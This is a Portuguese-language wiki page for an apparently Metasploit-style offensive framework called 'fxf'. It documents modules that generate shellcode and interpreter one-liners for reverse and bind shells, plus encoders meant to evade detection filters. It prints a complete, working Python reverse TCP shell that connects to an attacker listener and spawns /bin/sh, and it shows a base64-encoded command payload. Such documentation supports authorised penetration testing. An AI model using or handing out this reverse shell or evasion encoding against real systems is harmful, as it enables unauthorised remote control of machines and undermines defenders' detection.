# Payloads e encoders

**Idioma:** Português (pt-BR). **English:** [../en-US/09-payloads-and-encoders.md](../en-US/09-payloads-and-encoders.md)

---

## Payloads — `payloads/*`

Geram shellcode ou one-liners de interpretador para shells reversos/bind. Arquiteturas disponíveis: `armle`, `mipsbe`, `mipsle`, `x86`, `x64` e interpretadores `cmd/`.

### Famílias de arquitetura

| Prefixo de caminho | Arquitetura / tipo |
|--------------------|-------------------|
| `payloads/x86/` | Shellcode x86 32-bit |
| `payloads/x64/` | Shellcode x86-64 64-bit |
| `payloads/armle/` | Shellcode ARM little-endian |
| `payloads/mipsbe/` | Shellcode MIPS big-endian |
| `payloads/mipsle/` | Shellcode MIPS little-endian |
| `payloads/python/` | One-liners Python |
| `payloads/php/` | One-liners PHP |
| `payloads/perl/` | One-liners Perl |
| `payloads/cmd/` | Comandos Bash / netcat / PowerShell |

### Opções comuns de payload

| Opção | Tipo | Padrão | Descrição |
|-------|------|--------|-----------|
| `lhost` | `OptIP` | `""` | IP do listener do atacante |
| `lport` | `OptPort` | `4444` | Porta do listener (inteiro 1–65535) |
| `badchars` | `OptString` | `""` | Bytes a evitar no shellcode (hex, ex.: `\x00\x0a`) |
| `format` | `OptString` | `"raw"` | Formato de saída: `raw`, `c`, `python`, `hex` |

### Exemplo de uso — Python Reverse TCP

```text
fxf > use payloads/python/reverse_tcp
fxf (Python Reverse TCP) > set lhost 192.168.56.1
fxf (Python Reverse TCP) > set lport 4444
fxf (Python Reverse TCP) > run
```

**Saída de exemplo:**
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.1",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

> **Nota:** Trate a saída como sensível. Soluções AV/EDR podem sinalizar os payloads gerados.

---

## Encoders — `encoders/<linguagem>/*`

Transformam shellcode ou strings para evadir filtros de detecção. Linguagens disponíveis: `python`, `php`, `perl`.

### Encoders disponíveis

| Caminho | Linguagem | Codificação |
|---------|-----------|-------------|
| `encoders/python/base64` | Python | Base64 |
| `encoders/python/hex` | Python | Hexadecimal |
| `encoders/python/rot13` | Python | ROT-13 |
| `encoders/python/url` | Python | URL percent-encoding |
| `encoders/python/base32` | Python | Base32 |
| `encoders/php/base64` | PHP | Base64 |
| `encoders/php/hex` | PHP | Hexadecimal |
| `encoders/perl/base64` | Perl | Base64 |
| `encoders/perl/hex` | Perl | Hexadecimal |

### Opções de encoder

| Opção | Tipo | Padrão | Descrição |
|-------|------|--------|-----------|
| `data` | `OptString` | `""` | String de entrada ou shellcode a codificar |
| `iterations` | `OptInteger` | `1` | Número de iterações de codificação |

### Exemplo de uso

```text
fxf > use encoders/python/base64
fxf (Python Base64 Encoder) > set data "import os; os.system('id')"
fxf (Python Base64 Encoder) > run
```

**Saída de exemplo:**
```
aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=
```

---

[Hub da wiki](../README.md)
